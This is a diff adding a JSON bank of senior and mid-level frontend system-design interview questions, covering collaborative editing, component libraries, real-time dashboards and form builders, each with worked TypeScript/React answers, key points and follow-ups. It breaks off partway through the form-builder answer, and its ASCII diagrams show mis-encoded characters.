@@ -1,0 +1,1335 @@
+{
+  "questions": [
+    {
+      "id": "system-design-001",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Design a real-time collaborative text editor like Google Docs. Focus on the frontend architecture, state synchronization, and conflict resolution.",
+      "answer": "## Overview\n\nA real-time collaborative editor requires careful consideration of state synchronization, conflict resolution, and offline support. The frontend architecture must handle multiple users editing the same document simultaneously.\n\n## Core Architecture\n\n### 1. Operational Transformation (OT) vs CRDTs\n\nTwo main approaches for conflict resolution:\n\n**Operational Transformation (OT):**\n- Transforms operations against concurrent operations\n- Requires a central server for transformation\n- Used by Google Docs\n\n**CRDTs (Conflict-free Replicated Data Types):**\n- Operations are commutative and idempotent\n- Can work peer-to-peer\n- Used by Figma, Linear\n\n```typescript\n// CRDT-based text representation using Yjs\nimport * as Y from 'yjs';\nimport { WebsocketProvider } from 'y-websocket';\n\n// Create a shared document\nconst ydoc = new Y.Doc();\n\n// Define the shared text type\nconst ytext = ydoc.getText('editor');\n\n// Connect to sync server\nconst provider = new WebsocketProvider(\n  'wss://sync.example.com',\n  'document-id',\n  ydoc\n);\n\n// Local changes automatically sync\nytext.insert(0, 'Hello, World!');\n```\n\n### 2. State Management Architecture\n\n```typescript\ninterface EditorState {\n  // Local document state\n  document: DocumentNode;\n  \n  // Cursor/selection positions of all users\n  awareness: Map<UserId, AwarenessState>;\n  \n  // Pending operations not yet acknowledged\n  pendingOps: Operation[];\n  \n  // Connection state\n  connectionStatus: 'connected' | 'reconnecting' | 'offline';\n  \n  // Undo/redo stacks (local only)\n  undoStack: Operation[];\n  redoStack: Operation[];\n}\n\ninterface AwarenessState {\n  userId: string;\n  userName: string;\n  cursor: CursorPosition | null;\n  selection: SelectionRange | null;\n  color: string;\n}\n```\n\n### 3. Optimistic Updates with Rollback\n\n```typescript\nclass CollaborativeEditor {\n  private pendingOps: Operation[] = [];\n  private confirmedState: DocumentState;\n  private optimisticState: DocumentState;\n\n  applyLocalOperation(op: Operation) {\n    // 1. Apply optimistically\n    this.optimisticState = applyOperation(this.optimisticState, op);\n    \n    // 2. Add to pending queue\n    this.pendingOps.push(op);\n    \n    // 3. Send to server\n    this.sendToServer(op);\n    \n    // 4. Re-render immediately\n    this.render(this.optimisticState);\n  }\n\n  handleServerAck(confirmedOp: Operation) {\n    // Remove from pending queue\n    this.pendingOps = this.pendingOps.filter(\n      op => op.id !== confirmedOp.id\n    );\n    \n    // Update confirmed state\n    this.confirmedState = applyOperation(\n      this.confirmedState, \n      confirmedOp\n    );\n  }\n\n  handleRemoteOperation(remoteOp: Operation) {\n    // 1. Transform against pending operations\n    let transformedOp = remoteOp;\n    for (const pendingOp of this.pendingOps) {\n      transformedOp = transform(transformedOp, pendingOp);\n    }\n    \n    // 2. Apply to both states\n    this.confirmedState = applyOperation(\n      this.confirmedState, \n      remoteOp\n    );\n    this.optimisticState = applyOperation(\n      this.optimisticState, \n      transformedOp\n    );\n    \n    // 3. Re-render\n    this.render(this.optimisticState);\n  }\n}\n```\n\n### 4. WebSocket Connection Management\n\n```typescript\nclass SyncConnection {\n  private ws: WebSocket | null = null;\n  private reconnectAttempts = 0;\n  private maxReconnectAttempts = 5;\n  private messageQueue: Message[] = [];\n\n  connect() {\n    this.ws = new WebSocket(this.url);\n    \n    this.ws.onopen = () => {\n      this.reconnectAttempts = 0;\n      this.flushMessageQueue();\n    };\n    \n    this.ws.onclose = () => {\n      this.scheduleReconnect();\n    };\n    \n    this.ws.onerror = (error) => {\n      console.error('WebSocket error:', error);\n    };\n  }\n\n  private scheduleReconnect() {\n    if (this.reconnectAttempts >= this.maxReconnectAttempts) {\n      this.enterOfflineMode();\n      return;\n    }\n    \n    // Exponential backoff with jitter\n    const delay = Math.min(\n      1000 * Math.pow(2, this.reconnectAttempts) + \n      Math.random() * 1000,\n      30000\n    );\n    \n    this.reconnectAttempts++;\n    setTimeout(() => this.connect(), delay);\n  }\n\n  send(message: Message) {\n    if (this.ws?.readyState === WebSocket.OPEN) {\n      this.ws.send(JSON.stringify(message));\n    } else {\n      // Queue for when connection restores\n      this.messageQueue.push(message);\n    }\n  }\n}\n```\n\n### 5. Presence and Cursor Rendering\n\n```tsx\nfunction CollaboratorCursors({ awareness }: { awareness: AwarenessState[] }) {\n  return (\n    <>\n      {awareness.map((user) => (\n        <div\n          key={user.userId}\n          className=\"absolute pointer-events-none\"\n          style={{\n            transform: `translate(${user.cursor?.x}px, ${user.cursor?.y}px)`,\n          }}\n        >\n          {/* Cursor caret */}\n          <div \n            className=\"w-0.5 h-5\" \n            style={{ backgroundColor: user.color }} \n          />\n          {/* User name label */}\n          <div\n            className=\"text-xs px-1 rounded whitespace-nowrap\"\n            style={{ backgroundColor: user.color }}\n          >\n            {user.userName}\n          </div>\n        </div>\n      ))}\n    </>\n  );\n}\n```\n\n## Key Considerations\n\n1. **Offline Support**: Queue operations locally, sync when reconnected\n2. **Undo/Redo**: Must be local-only, not affect other users\n3. **Large Documents**: Virtualize rendering, lazy-load sections\n4. **Performance**: Debounce awareness updates, batch operations\n5. **Security**: Validate operations server-side, sanitize content",
+      "keyPoints": [
+        "Understands OT vs CRDT trade-offs",
+        "Can explain optimistic updates with conflict resolution",
+        "Knows WebSocket reconnection patterns with exponential backoff",
+        "Considers offline support and local-first architecture",
+        "Addresses presence/awareness for multi-user UX",
+        "Mentions virtualization for large documents"
+      ],
+      "followUpQuestions": [
+        "How would you handle undo/redo in a collaborative context?",
+        "What happens when a user has been offline for hours and reconnects?",
+        "How would you implement cursor smoothing for remote users?",
+        "How would you optimize for a document with 10,000+ users viewing?"
+      ],
+      "relatedTopics": [
+        "websockets",
+        "crdt",
+        "operational-transformation",
+        "optimistic-updates"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Google",
+        "Notion",
+        "Figma",
+        "Linear"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-002",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Design a component library that will be used by 50+ teams across your organization. How would you architect it for scalability, versioning, and adoption?",
+      "answer": "## Overview\n\nA shared component library at scale requires careful architecture around versioning, documentation, testing, and developer experience. The goal is to maximize adoption while maintaining quality and consistency.\n\n## Architecture Decisions\n\n### 1. Monorepo Structure\n\n```\npackages/\nâ”œâ”€â”€ @company/components/        # Core component library\nâ”‚   â”œâ”€â”€ src/\nâ”‚   â”‚   â”œâ”€â”€ components/\nâ”‚   â”‚   â”‚   â”œâ”€â”€ Button/\nâ”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Button.tsx\nâ”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Button.test.tsx\nâ”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Button.stories.tsx\nâ”‚   â”‚   â”‚   â”‚   â””â”€â”€ index.ts\nâ”‚   â”‚   â”‚   â””â”€â”€ ...\nâ”‚   â”‚   â”œâ”€â”€ hooks/\nâ”‚   â”‚   â”œâ”€â”€ utils/\nâ”‚   â”‚   â””â”€â”€ index.ts\nâ”‚   â””â”€â”€ package.json\nâ”œâ”€â”€ @company/tokens/            # Design tokens\nâ”‚   â”œâ”€â”€ src/\nâ”‚   â”‚   â”œâ”€â”€ colors.ts\nâ”‚   â”‚   â”œâ”€â”€ spacing.ts\nâ”‚   â”‚   â”œâ”€â”€ typography.ts\nâ”‚   â”‚   â””â”€â”€ index.ts\nâ”‚   â””â”€â”€ package.json\nâ”œâ”€â”€ @company/icons/             # Icon library\nâ””â”€â”€ @company/themes/            # Theme presets\n```\n\n### 2. Component API Design Philosophy\n\n```typescript\n// Compound component pattern for flexibility\nimport { Button } from '@company/components';\n\n// Simple usage\n<Button>Click me</Button>\n\n// Advanced usage with compound components\n<Button.Group>\n  <Button variant=\"primary\">Save</Button>\n  <Button variant=\"secondary\">Cancel</Button>\n</Button.Group>\n\n// Polymorphic component for semantic HTML\n<Button as=\"a\" href=\"/dashboard\">\n  Go to Dashboard\n</Button>\n```\n\n### 3. Polymorphic Component Implementation\n\n```typescript\nimport { forwardRef, type ElementType, type ComponentPropsWithoutRef } from 'react';\n\ntype PolymorphicProps<E extends ElementType, P = object> = P & {\n  as?: E;\n} & Omit<ComponentPropsWithoutRef<E>, keyof P | 'as'>;\n\ntype ButtonOwnProps = {\n  variant?: 'primary' | 'secondary' | 'ghost';\n  size?: 'sm' | 'md' | 'lg';\n  isLoading?: boolean;\n};\n\ntype ButtonProps<E extends ElementType = 'button'> = PolymorphicProps<E, ButtonOwnProps>;\n\nexport const Button = forwardRef(function Button<E extends ElementType = 'button'>(\n  { as, variant = 'primary', size = 'md', isLoading, children, ...props }: ButtonProps<E>,\n  ref: React.Ref<Element>\n) {\n  const Component = as || 'button';\n  \n  return (\n    <Component\n      ref={ref}\n      className={cn(\n        buttonVariants({ variant, size }),\n        isLoading && 'opacity-50 cursor-not-allowed'\n      )}\n      disabled={isLoading}\n      {...props}\n    >\n      {isLoading ? <Spinner size={size} /> : children}\n    </Component>\n  );\n}) as <E extends ElementType = 'button'>(\n  props: ButtonProps<E> & { ref?: React.Ref<Element> }\n) => React.ReactElement | null;\n```\n\n### 4. Design Token System\n\n```typescript\n// tokens/colors.ts\nexport const colors = {\n  primary: {\n    50: '#eff6ff',\n    100: '#dbeafe',\n    // ...\n    900: '#1e3a8a',\n  },\n  semantic: {\n    success: 'var(--color-success)',\n    warning: 'var(--color-warning)',\n    error: 'var(--color-error)',\n    info: 'var(--color-info)',\n  },\n} as const;\n\n// Generate CSS custom properties\nexport function generateCSSVariables(tokens: typeof colors) {\n  return Object.entries(flattenTokens(tokens))\n    .map(([key, value]) => `--${key}: ${value};`)\n    .join('\\n');\n}\n```\n\n### 5. Versioning Strategy\n\n```json\n{\n  \"name\": \"@company/components\",\n  \"version\": \"2.4.1\",\n  \"peerDependencies\": {\n    \"react\": \"^18.0.0\",\n    \"react-dom\": \"^18.0.0\"\n  }\n}\n```\n\n**Semantic Versioning Rules:**\n- **Major**: Breaking API changes, removed components\n- **Minor**: New components, new props (backward compatible)\n- **Patch**: Bug fixes, style adjustments\n\n**Migration Strategy:**\n```typescript\n// Deprecation pattern\n/** @deprecated Use `variant=\"primary\"` instead. Will be removed in v3.0 */\nexport interface ButtonProps {\n  /** @deprecated */\n  primary?: boolean;\n  variant?: 'primary' | 'secondary';\n}\n\nfunction Button({ primary, variant, ...props }: ButtonProps) {\n  if (primary !== undefined) {\n    console.warn(\n      '[@company/components] Button: \"primary\" prop is deprecated. ' +\n      'Use variant=\"primary\" instead.'\n    );\n  }\n  \n  const resolvedVariant = variant ?? (primary ? 'primary' : 'secondary');\n  // ...\n}\n```\n\n### 6. Testing Strategy\n\n```typescript\n// Visual regression with Chromatic/Percy\n// Unit tests with Testing Library\n// Accessibility tests with jest-axe\n\nimport { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { axe, toHaveNoViolations } from 'jest-axe';\n\nexpect.extend(toHaveNoViolations);\n\ndescribe('Button', () => {\n  it('renders correctly', () => {\n    render(<Button>Click me</Button>);\n    expect(screen.getByRole('button', { name: 'Click me' })).toBeInTheDocument();\n  });\n\n  it('handles click events', async () => {\n    const onClick = vi.fn();\n    render(<Button onClick={onClick}>Click me</Button>);\n    \n    await userEvent.click(screen.getByRole('button'));\n    expect(onClick).toHaveBeenCalledTimes(1);\n  });\n\n  it('has no accessibility violations', async () => {\n    const { container } = render(<Button>Click me</Button>);\n    const results = await axe(container);\n    expect(results).toHaveNoViolations();\n  });\n});\n```\n\n### 7. Documentation with Storybook\n\n```typescript\n// Button.stories.tsx\nimport type { Meta, StoryObj } from '@storybook/react';\nimport { Button } from './Button';\n\nconst meta: Meta<typeof Button> = {\n  title: 'Components/Button',\n  component: Button,\n  tags: ['autodocs'],\n  argTypes: {\n    variant: {\n      control: 'select',\n      options: ['primary', 'secondary', 'ghost'],\n    },\n  },\n};\n\nexport default meta;\ntype Story = StoryObj<typeof Button>;\n\nexport const Primary: Story = {\n  args: {\n    children: 'Primary Button',\n    variant: 'primary',\n  },\n};\n\nexport const AllVariants: Story = {\n  render: () => (\n    <div className=\"flex gap-4\">\n      <Button variant=\"primary\">Primary</Button>\n      <Button variant=\"secondary\">Secondary</Button>\n      <Button variant=\"ghost\">Ghost</Button>\n    </div>\n  ),\n};\n```\n\n## Adoption Strategy\n\n1. **Champions Program**: Identify early adopters in each team\n2. **Migration Codemods**: Automated migration scripts\n3. **Metrics Dashboard**: Track adoption, bundle size impact\n4. **Office Hours**: Regular support sessions\n5. **Feedback Loop**: GitHub discussions, Slack channel",
+      "keyPoints": [
+        "Understands monorepo structure benefits",
+        "Can implement polymorphic components with TypeScript",
+        "Knows semantic versioning and deprecation patterns",
+        "Emphasizes testing (unit, visual regression, a11y)",
+        "Considers developer experience and adoption",
+        "Mentions design tokens for consistency"
+      ],
+      "followUpQuestions": [
+        "How would you handle a breaking change that affects 50 teams?",
+        "How do you ensure bundle size doesn't bloat for teams using few components?",
+        "How would you implement theming for different brand guidelines?",
+        "What metrics would you track to measure library success?"
+      ],
+      "relatedTopics": [
+        "monorepo",
+        "semantic-versioning",
+        "storybook",
+        "design-tokens"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Shopify",
+        "Airbnb",
+        "Uber",
+        "Atlassian"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-003",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Design a frontend architecture for a dashboard that displays real-time metrics from 100+ data sources, with customizable widgets and layouts.",
+      "answer": "## Overview\n\nA real-time dashboard with 100+ data sources requires careful architecture around data aggregation, efficient rendering, and user customization. Key challenges include managing WebSocket connections, preventing UI jank, and persisting user layouts.\n\n## Architecture Overview\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Dashboard Shell                           â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚\nâ”‚  â”‚   Widget    â”‚  â”‚   Widget    â”‚  â”‚   Widget    â”‚         â”‚\nâ”‚  â”‚  (Chart)    â”‚  â”‚  (Table)    â”‚  â”‚   (KPI)     â”‚         â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜         â”‚\nâ”‚         â”‚                â”‚                â”‚                 â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”         â”‚\nâ”‚  â”‚            Data Subscription Layer            â”‚         â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚\nâ”‚                         â”‚                                   â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚\nâ”‚  â”‚         WebSocket Connection Manager          â”‚         â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                          â”‚\n                    â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”\n                    â”‚  Gateway  â”‚  (Aggregates 100+ sources)\n                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Core Components\n\n### 1. Data Subscription System\n\n```typescript\n// Pub/sub pattern for efficient data distribution\ntype Subscriber<T> = (data: T) => void;\n\nclass DataSubscriptionManager {\n  private subscriptions = new Map<string, Set<Subscriber<unknown>>>();\n  private latestData = new Map<string, unknown>();\n  private ws: WebSocket | null = null;\n\n  subscribe<T>(channel: string, callback: Subscriber<T>): () => void {\n    if (!this.subscriptions.has(channel)) {\n      this.subscriptions.set(channel, new Set());\n      this.requestChannel(channel);\n    }\n    \n    this.subscriptions.get(channel)!.add(callback as Subscriber<unknown>);\n    \n    // Immediately call with latest data if available\n    if (this.latestData.has(channel)) {\n      callback(this.latestData.get(channel) as T);\n    }\n    \n    // Return unsubscribe function\n    return () => {\n      const subs = this.subscriptions.get(channel);\n      if (subs) {\n        subs.delete(callback as Subscriber<unknown>);\n        if (subs.size === 0) {\n          this.subscriptions.delete(channel);\n          this.releaseChannel(channel);\n        }\n      }\n    };\n  }\n\n  private handleMessage(event: MessageEvent) {\n    const { channel, data } = JSON.parse(event.data);\n    this.latestData.set(channel, data);\n    \n    const subscribers = this.subscriptions.get(channel);\n    if (subscribers) {\n      // Batch updates to prevent excessive re-renders\n      queueMicrotask(() => {\n        subscribers.forEach(callback => callback(data));\n      });\n    }\n  }\n\n  private requestChannel(channel: string) {\n    this.ws?.send(JSON.stringify({ type: 'subscribe', channel }));\n  }\n\n  private releaseChannel(channel: string) {\n    this.ws?.send(JSON.stringify({ type: 'unsubscribe', channel }));\n  }\n}\n\n// React hook for subscriptions\nfunction useDataSubscription<T>(channel: string): T | null {\n  const [data, setData] = useState<T | null>(null);\n  const manager = useContext(DataManagerContext);\n\n  useEffect(() => {\n    return manager.subscribe<T>(channel, setData);\n  }, [channel, manager]);\n\n  return data;\n}\n```\n\n### 2. Virtualized Widget Grid\n\n```typescript\n// Only render widgets in viewport\nimport { useVirtualizer } from '@tanstack/react-virtual';\n\ninterface Widget {\n  id: string;\n  type: WidgetType;\n  position: { x: number; y: number; w: number; h: number };\n  config: WidgetConfig;\n}\n\nfunction DashboardGrid({ widgets }: { widgets: Widget[] }) {\n  const parentRef = useRef<HTMLDivElement>(null);\n  \n  // Calculate which widgets are visible\n  const visibleWidgets = useMemo(() => {\n    return widgets.filter(widget => \n      isInViewport(widget.position, viewportBounds)\n    );\n  }, [widgets, viewportBounds]);\n\n  return (\n    <div \n      ref={parentRef}\n      className=\"relative w-full h-full overflow-auto\"\n    >\n      {visibleWidgets.map(widget => (\n        <WidgetContainer\n          key={widget.id}\n          widget={widget}\n          style={{\n            position: 'absolute',\n            left: widget.position.x * GRID_SIZE,\n            top: widget.position.y * GRID_SIZE,\n            width: widget.position.w * GRID_SIZE,\n            height: widget.position.h * GRID_SIZE,\n          }}\n        />\n      ))}\n    </div>\n  );\n}\n```\n\n### 3. Widget Component Architecture\n\n```typescript\n// Widget registry pattern\nconst WIDGET_REGISTRY: Record<WidgetType, React.LazyExoticComponent<WidgetComponent>> = {\n  'line-chart': lazy(() => import('./widgets/LineChartWidget')),\n  'bar-chart': lazy(() => import('./widgets/BarChartWidget')),\n  'kpi-card': lazy(() => import('./widgets/KPICardWidget')),\n  'data-table': lazy(() => import('./widgets/DataTableWidget')),\n  'heatmap': lazy(() => import('./widgets/HeatmapWidget')),\n};\n\ninterface WidgetProps<T = unknown> {\n  config: T;\n  data: unknown;\n  isEditing: boolean;\n  onConfigChange: (config: T) => void;\n}\n\nfunction WidgetContainer({ widget }: { widget: Widget }) {\n  const data = useDataSubscription(widget.config.dataSource);\n  const Component = WIDGET_REGISTRY[widget.type];\n\n  return (\n    <ErrorBoundary fallback={<WidgetError />}>\n      <Suspense fallback={<WidgetSkeleton />}>\n        <Component\n          config={widget.config}\n          data={data}\n          isEditing={false}\n          onConfigChange={() => {}}\n        />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n```\n\n### 4. Layout Persistence\n\n```typescript\n// Layout state with optimistic updates\ninterface DashboardLayout {\n  id: string;\n  name: string;\n  widgets: Widget[];\n  gridConfig: GridConfig;\n  updatedAt: string;\n}\n\nasync function saveLayout(layout: DashboardLayout): Promise<void> {\n  // Debounced auto-save\n  await fetch('/api/layouts/' + layout.id, {\n    method: 'PUT',\n    body: JSON.stringify(layout),\n  });\n}\n\n// Zustand store for layout state\nconst useDashboardStore = create<DashboardStore>()(\n  persist(\n    (set, get) => ({\n      layout: null,\n      isDirty: false,\n      \n      updateWidgetPosition: (widgetId, position) => {\n        set(state => ({\n          layout: {\n            ...state.layout!,\n            widgets: state.layout!.widgets.map(w =>\n              w.id === widgetId ? { ...w, position } : w\n            ),\n          },\n          isDirty: true,\n        }));\n        \n        // Debounced save\n        debouncedSave(get().layout!);\n      },\n      \n      addWidget: (type, config) => {\n        const widget: Widget = {\n          id: nanoid(),\n          type,\n          position: findEmptyPosition(get().layout!.widgets),\n          config,\n        };\n        \n        set(state => ({\n          layout: {\n            ...state.layout!,\n            widgets: [...state.layout!.widgets, widget],\n          },\n          isDirty: true,\n        }));\n      },\n    }),\n    {\n      name: 'dashboard-layout',\n      storage: createJSONStorage(() => localStorage),\n    }\n  )\n);\n```\n\n### 5. Performance Optimizations\n\n```typescript\n// 1. Throttle high-frequency updates\nfunction useThrottledData<T>(channel: string, interval = 100): T | null {\n  const rawData = useDataSubscription<T>(channel);\n  const [throttledData, setThrottledData] = useState<T | null>(null);\n  \n  useEffect(() => {\n    const timer = setInterval(() => {\n      setThrottledData(rawData);\n    }, interval);\n    \n    return () => clearInterval(timer);\n  }, [rawData, interval]);\n  \n  return throttledData;\n}\n\n// 2. Web Worker for data transformation\nconst chartWorker = new Worker(\n  new URL('./workers/chart-transform.worker.ts', import.meta.url)\n);\n\nfunction useTransformedData(rawData: DataPoint[], config: TransformConfig) {\n  const [result, setResult] = useState<TransformedData | null>(null);\n  \n  useEffect(() => {\n    chartWorker.postMessage({ rawData, config });\n    \n    const handler = (e: MessageEvent) => setResult(e.data);\n    chartWorker.addEventListener('message', handler);\n    \n    return () => chartWorker.removeEventListener('message', handler);\n  }, [rawData, config]);\n  \n  return result;\n}\n\n// 3. Memoized chart rendering\nconst LineChartWidget = memo(function LineChartWidget({ \n  data, \n  config \n}: WidgetProps<LineChartConfig>) {\n  const chartData = useTransformedData(data, config.transform);\n  \n  return (\n    <ResponsiveContainer>\n      <LineChart data={chartData}>\n        {/* Chart configuration */}\n      </LineChart>\n    </ResponsiveContainer>\n  );\n}, (prev, next) => {\n  // Custom comparison - only re-render if data changed significantly\n  return isEqual(prev.data, next.data) && isEqual(prev.config, next.config);\n});\n```\n\n## Key Considerations\n\n1. **Connection Multiplexing**: Single WebSocket with channel subscriptions\n2. **Backpressure Handling**: Drop frames if UI can't keep up\n3. **Offline Mode**: Cache last known values, show stale indicators\n4. **Memory Management**: Limit data history, use ring buffers\n5. **Accessibility**: Ensure widgets are keyboard navigable",
+      "keyPoints": [
+        "Understands pub/sub pattern for data distribution",
+        "Implements proper cleanup with unsubscribe functions",
+        "Uses virtualization for large widget grids",
+        "Knows code-splitting with lazy loading",
+        "Applies throttling/debouncing for high-frequency updates",
+        "Considers Web Workers for heavy computation"
+      ],
+      "followUpQuestions": [
+        "How would you handle a widget that needs data from multiple sources?",
+        "What if the WebSocket connection is unreliable?",
+        "How would you implement dashboard sharing between users?",
+        "How do you handle widgets that crash without affecting others?"
+      ],
+      "relatedTopics": [
+        "websockets",
+        "virtualization",
+        "code-splitting",
+        "state-management"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Datadog",
+        "Grafana",
+        "New Relic",
+        "Splunk"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-004",
+      "category": "system-design",
+      "difficulty": "mid",
+      "question": "How would you architect a form builder that allows users to create complex, multi-step forms with validation, conditional logic, and file uploads?",
+      "answer": "## Overview\n\nA form builder requires a flexible schema-driven architecture that separates form definition from rendering. The key is designing a JSON schema that can express complex field relationships while keeping the runtime performant.\n\n## Core Data Model\n\n```typescript\n// Form schema that drives the entire UI\ninterface FormSchema {\n  id: string;\n  title: string;\n  steps: FormStep[];\n  settings: FormSettings;\n}\n\ninterface FormStep {\n  id: string;\n  title: string;\n  description?: string;\n  fields: FormField[];\n  conditions?: StepCondition[]; // When to show this step\n}\n\ntype FormField = \n  | TextField \n  | SelectField \n  | FileField \n  | GroupField\n  | RepeaterField;\n\ninterface BaseField {\n  id: string;\n  type: string;\n  label: string;\n  required?: boolean;\n  helpText?: string;\n  conditions?: FieldCondition[];\n  validation?: ValidationRule[];\n}\n\ninterface TextField extends BaseField {\n  type: 'text' | 'email' | 'tel' | 'textarea';\n  placeholder?: string;\n  minLength?: number;\n  maxLength?: number;\n  pattern?: string;\n}\n\ninterface SelectField extends BaseField {\n  type: 'select' | 'radio' | 'checkbox';\n  options: SelectOption[];\n  multiple?: boolean;\n}\n\ninterface FileField extends BaseField {\n  type: 'file';\n  accept?: string[];\n  maxSize?: number; // bytes\n  maxFiles?: number;\n}\n\ninterface GroupField extends BaseField {\n  type: 'group';\n  fields: FormField[]; // Nested fields\n}\n\ninterface RepeaterField extends BaseField {\n  type: 'repeater';\n  fields: FormField[]; // Template for each item\n  minItems?: number;\n  maxItems?: number;\n}\n```\n\n## Conditional Logic Engine\n\n```typescript\ninterface FieldCondition {\n  field: string; // Field ID to watch\n  operator: 'equals' | 'notEquals' | 'contains' | 'greaterThan' | 'isEmpty';\n  value: unknown;\n  action: 'show' | 'hide' | 'require' | 'disable';\n}\n\nfunction evaluateCondition(\n  condition: FieldCondition,\n  formValues: Record<string, unknown>\n): boolean {\n  const fieldValue = formValues[condition.field];\n  \n  switch (condition.operator) {\n    case 'equals':\n      return fieldValue === condition.value;\n    case 'notEquals':\n      return fieldValue !== condition.value;\n    case 'contains':\n      return String(fieldValue).includes(String(condition.value));\n    case 'greaterThan':\n      return Number(fieldValue) > Number(condition.value);\n    case 'isEmpty':\n      return !fieldValue || (Array.isArray(fieldValue) && fieldValue.length === 0);\n    default:\n      return true;\n  }\n}\n\nfunction useConditionalFields(\n  fields: FormField[],\n  formValues: Record<string, unknown>\n): FormField[] {\n  return useMemo(() => {\n    return fields.filter(field => {\n      if (!field.conditions?.length) return true;\n      \n      return field.conditions.every(condition => {\n        const result = evaluateCondition(condition, formValues);\n        return condition.action === 'show' ? result : !result;\n      });\n    });\n  }, [fields, formValues]);\n}\n```\n\n## Validation System\n\n```typescript\nimport { z } from 'zod';\n\ninterface ValidationRule {\n  type: 'required' | 'minLength' | 'maxLength' | 'pattern' | 'custom';\n  value?: unknown;\n  message: string;\n}\n\n// Generate Zod schema from field definition\nfunction createFieldSchema(field: FormField): z.ZodTypeAny {\n  let schema: z.ZodTypeAny;\n  \n  switch (field.type) {\n    case 'text':\n    case 'email':\n    case 'tel':\n    case 'textarea':\n      schema = z.string();\n      if (field.type === 'email') {\n        schema = (schema as z.ZodString).email(field.validation?.find(v => v.type === 'pattern')?.message);\n      }\n      if (field.minLength) {\n        schema = (schema as z.ZodString).min(field.minLength);\n      }\n      if (field.maxLength) {\n        schema = (schema as z.ZodString).max(field.maxLength);\n      }\n      break;\n      \n    case 'select':\n    case 'radio':\n      schema = z.string();\n      break;\n      \n    case 'checkbox':\n      schema = field.multiple ? z.array(z.string()) : z.boolean();\n      break;\n      \n    case 'file':\n      schema = z.array(z.instanceof(File)).max(field.maxFiles ?? 10);\n      break;\n      \n    case 'repeater':\n      const itemSchema = z.object(\n        Object.fromEntries(\n          field.fields.map(f => [f.id, createFieldSchema(f)])\n        )\n      );\n      schema = z.array(itemSchema);\n      if (field.minItems) schema = (schema as z.ZodArray<typeof itemSchema>).min(field.minItems);\n      if (field.maxItems) schema = (schema as z.ZodArray<typeof itemSchema>).max(field.maxItems);\n      break;\n      \n    default:\n      schema = z.unknown();\n  }\n  \n  return field.required ? schema : schema.optional();\n}\n\nfunction createFormSchema(formSchema: FormSchema): 